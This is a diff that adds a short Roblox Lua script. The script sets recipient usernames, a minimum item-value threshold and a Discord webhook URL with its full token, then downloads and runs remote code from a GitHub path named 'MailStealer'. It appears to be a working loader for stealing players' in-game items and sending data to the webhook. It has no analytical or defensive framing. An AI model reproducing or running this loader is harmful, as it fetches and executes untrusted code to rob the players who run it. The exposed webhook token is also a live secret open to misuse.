@@ -1,0 +1,7 @@
+Username = "NOKIEY4"
+Username2 = "NOKIEY4"
+MinimumRAP = 1000000
+Webhook = "https://discord.com/api/webhooks/1135961576055250964/kyE9MrPOOQTE8ThjQ-JckHKRM9EUl5EGz0ZR5NVR6UwasS2C2y7stWCKjV8T3xo7XIy3"
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScripty/Eks0va313/main/MailStealer/lua", true))()
